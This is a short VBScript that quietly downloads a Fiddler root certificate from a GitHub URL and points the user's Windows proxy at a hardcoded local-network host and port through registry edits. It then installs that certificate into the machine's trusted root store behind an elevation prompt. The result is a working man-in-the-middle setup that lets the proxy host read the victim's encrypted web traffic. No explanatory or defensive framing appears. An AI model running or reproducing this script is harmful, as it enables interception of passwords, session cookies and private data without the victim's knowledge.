Set objShell = CreateObject("WScript.Shell")
Set oShell = CreateObject("Shell.Application")

HOST = "192.168.95.130"
PORT = "8888"

objShell.Run "cmd /c powershell Invoke-WebRequest -URI ""https://github.com/nick6996war/fidll/raw/main/FiddlerRoot.cer"" -OutFile ""$Env:temp\FiddlerRoot.cer""", 0, True
objShell.Run "cmd /c reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 0x00000001 /f", 0, True
objShell.Run "cmd /c reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer /t REG_SZ /d " & HOST & ":" & PORT & " /f", 0, True
oShell.ShellExecute "powershell", "Import-Certificate -FilePath ""$Env:temp\FiddlerRoot.cer"" -CertStoreLocation ""Cert:\LocalMachine\Root"" -Verbose;", "", "runas", 1
WScript.Quit 1